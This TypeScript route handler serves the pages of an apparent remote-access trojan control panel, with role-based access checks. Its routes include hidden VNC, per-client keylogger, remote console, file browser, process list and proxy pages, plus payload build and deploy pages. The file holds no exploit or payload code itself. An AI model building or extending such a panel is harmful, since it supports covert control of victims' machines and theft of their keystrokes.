import { authenticateRequest } from "../../auth";
import { requirePermission } from "../../rbac";
import { getUserById } from "../../users";

type PageRouteDeps = {
  PUBLIC_ROOT: string;
  secureHeaders: (contentType?: string) => Record<string, string>;
  mimeType: (path: string) => string;
};

async function serveLoginOrUnauthorized(deps: PageRouteDeps): Promise<Response> {
  const loginFile = Bun.file(`${deps.PUBLIC_ROOT}/login.html`);
  if (await loginFile.exists()) {
    return new Response(loginFile, { headers: deps.secureHeaders(deps.mimeType("/login.html")) });
  }
  return new Response("Unauthorized", { status: 401 });
}

async function serveChangePasswordIfRequired(
  deps: PageRouteDeps,
  userId: number,
): Promise<Response | null> {
  const dbUser = getUserById(userId);
  if (dbUser && dbUser.must_change_password) {
    const changePassFile = Bun.file(`${deps.PUBLIC_ROOT}/change-password.html`);
    if (await changePassFile.exists()) {
      return new Response(changePassFile, {
        headers: deps.secureHeaders(deps.mimeType("/change-password.html")),
      });
    }
  }
  return null;
}

export async function handlePageRoutes(
  req: Request,
  url: URL,
  deps: PageRouteDeps,
): Promise<Response | null> {
  if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/index.html")) {
    const authed = await authenticateRequest(req);

    if (authed) {
      const maybeChange = await serveChangePasswordIfRequired(deps, authed.userId);
      if (maybeChange) return maybeChange;
    }

    const filePath = authed ? "/index.html" : "/login.html";
    const file = Bun.file(`${deps.PUBLIC_ROOT}${filePath}`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType(filePath)) });
    }
  }

  if (req.method === "GET" && url.pathname === "/change-password.html") {
    const file = Bun.file(`${deps.PUBLIC_ROOT}/change-password.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("/change-password.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/remotedesktop") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
    if (maybeChange) return maybeChange;

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const file = Bun.file(`${deps.PUBLIC_ROOT}/remotedesktop.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("remotedesktop.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/hvnc") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
    if (maybeChange) return maybeChange;

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const file = Bun.file(`${deps.PUBLIC_ROOT}/hvnc.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("hvnc.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/metrics") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
    if (maybeChange) return maybeChange;

    const file = Bun.file(`${deps.PUBLIC_ROOT}/metrics.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("metrics.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/logs") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
    if (maybeChange) return maybeChange;

    try {
      requirePermission(user, "audit:view");
    } catch (error) {
      if (error instanceof Response) return error;
      return new Response("Forbidden", { status: 403 });
    }

    const file = Bun.file(`${deps.PUBLIC_ROOT}/logs.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("logs.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/notifications") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
    if (maybeChange) return maybeChange;

    const file = Bun.file(`${deps.PUBLIC_ROOT}/notifications.html`);
    if (await file.exists()) {
      return new Response(file, {
        headers: deps.secureHeaders(deps.mimeType("notifications.html")),
      });
    }
  }

  if (req.method === "GET" && url.pathname === "/users") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
    if (maybeChange) return maybeChange;

    if (user.role !== "admin") {
      return new Response("Forbidden: Admin access required", { status: 403 });
    }

    const file = Bun.file(`${deps.PUBLIC_ROOT}/users.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("users.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/build") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role !== "admin" && user.role !== "operator") {
      return new Response("Forbidden: Admin or operator access required", { status: 403 });
    }

    const file = Bun.file(`${deps.PUBLIC_ROOT}/build.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("build.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/plugins") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role !== "admin" && user.role !== "operator") {
      return new Response("Forbidden: Admin or operator access required", { status: 403 });
    }

    const file = Bun.file(`${deps.PUBLIC_ROOT}/plugins.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("plugins.html")) });
    }
  }

  const consolePageMatch = url.pathname.match(/^\/(.+)\/console$/);
  if (req.method === "GET" && consolePageMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const file = Bun.file(`${deps.PUBLIC_ROOT}/console.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("console.html")) });
    }
  }

  const filesPageMatch = url.pathname.match(/^\/(.+)\/files$/);
  if (req.method === "GET" && filesPageMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const file = Bun.file(`${deps.PUBLIC_ROOT}/filebrowser.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("filebrowser.html")) });
    }
  }

  const processesPageMatch = url.pathname.match(/^\/(.+)\/processes$/);
  if (req.method === "GET" && processesPageMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const file = Bun.file(`${deps.PUBLIC_ROOT}/processes.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("processes.html")) });
    }
  }

  const keyloggerPageMatch = url.pathname.match(/^\/(.+)\/keylogger$/);
  if (req.method === "GET" && keyloggerPageMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const file = Bun.file(`${deps.PUBLIC_ROOT}/keylogger.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("keylogger.html")) });
    }
  }

  const proxyPageMatch = url.pathname.match(/^\/(.+)\/proxy$/);
  if (req.method === "GET" && proxyPageMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const file = Bun.file(`${deps.PUBLIC_ROOT}/proxy.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("proxy.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/scripts") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot execute scripts", { status: 403 });
    }

    const file = Bun.file(`${deps.PUBLIC_ROOT}/scripts.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("scripts.html")) });
    }
  }

  if (req.method === "GET" && url.pathname === "/deploy") {
    const user = await authenticateRequest(req);
    if (!user) {
      return serveLoginOrUnauthorized(deps);
    }

    if (user.role !== "admin") {
      return new Response("Forbidden: Admin access required", { status: 403 });
    }

    const file = Bun.file(`${deps.PUBLIC_ROOT}/deploy.html`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("deploy.html")) });
    }
  }

  return null;
}
